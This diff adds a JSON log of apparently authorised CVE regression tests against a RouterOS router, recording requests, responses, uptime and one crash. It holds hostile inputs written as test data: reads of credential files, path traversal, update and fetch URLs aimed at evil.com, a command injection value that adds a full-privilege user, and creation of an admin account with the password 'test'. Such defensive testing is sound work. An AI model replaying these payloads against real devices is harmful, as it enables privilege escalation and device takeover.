@@ -1,0 +1,413 @@
+{
+  "metadata": {
+    "script": "crash_isolation.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "timestamp": "2026-02-16T11:24:15.830540",
+    "purpose": "Isolate crash triggers from CVE regression testing",
+    "initial_uptime": "47m3s"
+  },
+  "cve_2023_30799_tests": [
+    {
+      "endpoint": "POST /rest/system/identity",
+      "header": "X-HTTP-Method-Override: PUT",
+      "body": {
+        "name": "escalation_test"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'no such command', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-01",
+      "description": "Method override: X-HTTP-Method-Override: PUT",
+      "timestamp": "2026-02-16T11:24:15.834542",
+      "pre_uptime": "47m3s",
+      "post_alive": true,
+      "post_uptime": "47m5s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/identity",
+      "header": "X-HTTP-Method-Override: DELETE",
+      "body": {
+        "name": "escalation_test"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'no such command', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-02",
+      "description": "Method override: X-HTTP-Method-Override: DELETE",
+      "timestamp": "2026-02-16T11:24:18.868058",
+      "pre_uptime": "47m6s",
+      "post_alive": true,
+      "post_uptime": "47m8s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/identity",
+      "header": "X-HTTP-Method-Override: PATCH",
+      "body": {
+        "name": "escalation_test"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'no such command', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-03",
+      "description": "Method override: X-HTTP-Method-Override: PATCH",
+      "timestamp": "2026-02-16T11:24:21.893570",
+      "pre_uptime": "47m9s",
+      "post_alive": true,
+      "post_uptime": "47m11s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/identity",
+      "header": "X-HTTP-Method: PUT",
+      "body": {
+        "name": "escalation_test"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'no such command', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-04",
+      "description": "Method override: X-HTTP-Method: PUT",
+      "timestamp": "2026-02-16T11:24:24.899072",
+      "pre_uptime": "47m12s",
+      "post_alive": true,
+      "post_uptime": "47m14s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/identity",
+      "header": "X-Method-Override: PUT",
+      "body": {
+        "name": "escalation_test"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'no such command', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-05",
+      "description": "Method override: X-Method-Override: PUT",
+      "timestamp": "2026-02-16T11:24:27.904574",
+      "pre_uptime": "47m15s",
+      "post_alive": true,
+      "post_uptime": "47m17s",
+      "crashed": false
+    },
+    {
+      "endpoint": "GET /rest/file/nova/etc/passwd",
+      "http_status": 400,
+      "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-06",
+      "description": "Super-admin path: /nova/etc/passwd",
+      "timestamp": "2026-02-16T11:24:30.910076",
+      "pre_uptime": "47m18s",
+      "post_alive": true,
+      "post_uptime": "47m20s",
+      "crashed": false
+    },
+    {
+      "endpoint": "GET /rest/file/nova/etc/shadow",
+      "http_status": 400,
+      "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-07",
+      "description": "Super-admin path: /nova/etc/shadow",
+      "timestamp": "2026-02-16T11:24:33.907574",
+      "pre_uptime": "47m21s",
+      "post_alive": true,
+      "post_uptime": "47m23s",
+      "crashed": false
+    },
+    {
+      "endpoint": "GET /rest/file/flash/nova/etc/devel-login",
+      "http_status": 400,
+      "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-08",
+      "description": "Super-admin path: /flash/nova/etc/devel-login",
+      "timestamp": "2026-02-16T11:24:36.925082",
+      "pre_uptime": "47m24s",
+      "post_alive": true,
+      "post_uptime": "47m26s",
+      "crashed": false
+    },
+    {
+      "endpoint": "GET /rest/file/rw/disk/user.dat",
+      "http_status": 400,
+      "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-09",
+      "description": "Super-admin path: /rw/disk/user.dat",
+      "timestamp": "2026-02-16T11:24:39.974606",
+      "pre_uptime": "47m27s",
+      "post_alive": true,
+      "post_uptime": "47m29s",
+      "crashed": false
+    },
+    {
+      "endpoint": "GET /rest/file/rw/disk/shadow",
+      "http_status": 400,
+      "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-10",
+      "description": "Super-admin path: /rw/disk/shadow",
+      "timestamp": "2026-02-16T11:24:42.980108",
+      "pre_uptime": "47m30s",
+      "post_alive": true,
+      "post_uptime": "47m32s",
+      "crashed": false
+    },
+    {
+      "command": "/user print detail",
+      "ssh_rc": 0,
+      "stdout": "Flags: E - expired; X - disabled \r\n 0    ;;; system default user\r\n      name=\"admin\" group=full inactivity-timeout=10m inactivity-policy=none \r\n      address=\"\" last-logged-in=2026-02-16 16:12:28 \r\n\r\n",
+      "stderr": "",
+      "test_id": "30799-11",
+      "description": "SSH: /user print detail",
+      "timestamp": "2026-02-16T11:24:45.985610",
+      "pre_uptime": "47m33s",
+      "post_alive": true,
+      "post_uptime": "47m35s",
+      "crashed": false
+    },
+    {
+      "command": "/system package print",
+      "ssh_rc": 0,
+      "stdout": "Columns: NAME, VERSION, BUILD-TIME, SIZE\r\n# NAME      VERSION  BUILD-TIME           SIZE   \r\n0 routeros  7.20.8   2026-01-30 09:17:54  19.1MiB\r\n\r\n",
+      "stderr": "",
+      "test_id": "30799-12",
+      "description": "SSH: /system package print",
+      "timestamp": "2026-02-16T11:24:49.051142",
+      "pre_uptime": "47m36s",
+      "post_alive": true,
+      "post_uptime": "47m38s",
+      "crashed": false
+    },
+    {
+      "command": "/system routerboard print",
+      "ssh_rc": 1,
+      "stdout": "bad command name routerboard (line 1 column 9)\n",
+      "stderr": "",
+      "test_id": "30799-13",
+      "description": "SSH: /system routerboard print (CHR specific)",
+      "timestamp": "2026-02-16T11:24:52.124678",
+      "pre_uptime": "47m39s",
+      "post_alive": true,
+      "post_uptime": "47m41s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/user/add",
+      "body": {
+        "name": "esc_test",
+        "group": "full",
+        "password": "test"
+      },
+      "http_status": 200,
+      "response": "{'ret': '*6'}",
+      "error": null,
+      "test_id": "30799-14",
+      "description": "Priv esc: POST /rest/user/add as admin",
+      "timestamp": "2026-02-16T11:24:55.198214",
+      "pre_uptime": "47m42s",
+      "post_alive": true,
+      "post_uptime": "47m44s",
+      "crashed": false
+    },
+    {
+      "endpoint": "PUT /rest/system/identity",
+      "body": {
+        "name": "escalation_test"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'missing or invalid resource identifier', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "30799-15",
+      "description": "Priv esc: POST /rest/system/identity with bad method",
+      "timestamp": "2026-02-16T11:24:58.211720",
+      "pre_uptime": "47m45s",
+      "post_alive": true,
+      "post_uptime": "47m47s",
+      "crashed": false
+    }
+  ],
+  "cve_2019_3976_tests": [
+    {
+      "endpoint": "POST /rest/system/package/update/set",
+      "body": {
+        "channel": "http://evil.com/update"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'input does not match any value of channel', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "3976-01",
+      "description": "Channel URL: http://evil.com/update",
+      "timestamp": "2026-02-16T11:25:01.225226",
+      "pre_uptime": "47m48s",
+      "post_alive": true,
+      "post_uptime": "47m50s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/package/update/set",
+      "body": {
+        "channel": "ftp://evil.com:21/update"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'input does not match any value of channel', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "3976-02",
+      "description": "Channel URL: ftp://evil.com:21/update",
+      "timestamp": "2026-02-16T11:25:04.234730",
+      "pre_uptime": "47m51s",
+      "post_alive": true,
+      "post_uptime": "47m53s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/package/update/set",
+      "body": {
+        "channel": "../../../../etc/passwd"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'input does not match any value of channel', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "3976-03",
+      "description": "Channel URL: ../../../../etc/passwd",
+      "timestamp": "2026-02-16T11:25:07.240232",
+      "pre_uptime": "47m54s",
+      "post_alive": true,
+      "post_uptime": "47m56s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/package/update/set",
+      "body": {
+        "channel": "long-term"
+      },
+      "http_status": 200,
+      "response": null,
+      "error": null,
+      "test_id": "3976-04",
+      "description": "Channel URL: (set back to long-term)",
+      "timestamp": "2026-02-16T11:25:10.241732",
+      "pre_uptime": "47m57s",
+      "post_alive": true,
+      "post_uptime": "47m59s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/system/package/update/check-for-updates",
+      "http_status": 200,
+      "response": "[{'.section': '0', 'channel': 'long-term', 'installed-version': '7.20.8', 'status': 'finding out latest version...'}, {'.section': '1', 'channel': 'long-term', 'installed-version': '7.20.8', 'latest-version': '7.20.8', 'status': 'System is already up to date'}]",
+      "error": null,
+      "test_id": "3976-05",
+      "description": "Check for updates",
+      "timestamp": "2026-02-16T11:25:13.243232",
+      "pre_uptime": "48m",
+      "post_alive": true,
+      "post_uptime": "48m3s",
+      "crashed": false
+    },
+    {
+      "command": "/system package down[REDACTED]",
+      "ssh_rc": 0,
+      "stdout": "",
+      "stderr": "",
+      "test_id": "3976-06",
+      "description": "SSH: /system package down[REDACTED]",
+      "timestamp": "2026-02-16T11:25:17.253236",
+      "pre_uptime": "48m4s",
+      "post_alive": false,
+      "post_uptime": null,
+      "crashed": true,
+      "recovery_uptime": "12s"
+    },
+    {
+      "endpoint": "POST /rest/file (multipart upload)",
+      "filename": "firmware.npk",
+      "size": 104,
+      "http_status": 415,
+      "response": "{\"error\":415,\"message\":\"Unsupported Media Type\"}",
+      "test_id": "3976-07",
+      "description": "Upload fake NPK firmware file",
+      "timestamp": "2026-02-16T11:25:35.334272",
+      "pre_uptime": "13s",
+      "post_alive": true,
+      "post_uptime": "15s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/tool/fetch",
+      "body": {
+        "url": "http://evil.com/firmware.npk",
+        "mode": "http"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "3976-08",
+      "description": "Fetch: http://evil.com/firmware.npk",
+      "timestamp": "2026-02-16T11:25:38.339774",
+      "pre_uptime": "16s",
+      "post_alive": true,
+      "post_uptime": "19s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/tool/fetch",
+      "body": {
+        "url": "ftp://evil.com/update.npk",
+        "mode": "ftp"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'failure: FTP server said: 530 Login incorrect', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "3976-09",
+      "description": "Fetch: ftp://evil.com/update.npk",
+      "timestamp": "2026-02-16T11:25:42.357782",
+      "pre_uptime": "20s",
+      "post_alive": true,
+      "post_uptime": "23s",
+      "crashed": false
+    },
+    {
+      "endpoint": "POST /rest/tool/fetch",
+      "body": {
+        "url": "http://127.0.0.1/backdoor",
+        "mode": "http"
+      },
+      "http_status": 400,
+      "response": "{'detail': 'failure: Fetch failed with status 404', 'error': 400, 'message': 'Bad Request'}",
+      "error": null,
+      "test_id": "3976-10",
+      "description": "Fetch: http://127.0.0.1/backdoor",
+      "timestamp": "2026-02-16T11:25:46.359782",
+      "pre_uptime": "24s",
+      "post_alive": true,
+      "post_uptime": "27s",
+      "crashed": false
+    },
+    {
+      "command": "/system package update set channel=\"http://evil.com; /user add name=x group=full\"",
+      "ssh_rc": 1,
+      "stdout": "input does not match any value of channel (/system/package/update/set (channel); line 1)\n",
+      "stderr": "",
+      "test_id": "3976-11",
+      "description": "SSH: channel set with injection",
+      "timestamp": "2026-02-16T11:25:50.369786",
+      "pre_uptime": "28s",
+      "post_alive": true,
+      "post_uptime": "31s",
+      "crashed": false
+    }
+  ],
+  "crashes": [
+    {
+      "test_id": "3976-06",
+      "description": "SSH: /system package down[REDACTED]",
+      "timestamp": "2026-02-16T11:25:17.253236",
+      "pre_uptime": "48m4s"
+    }
+  ]
+}
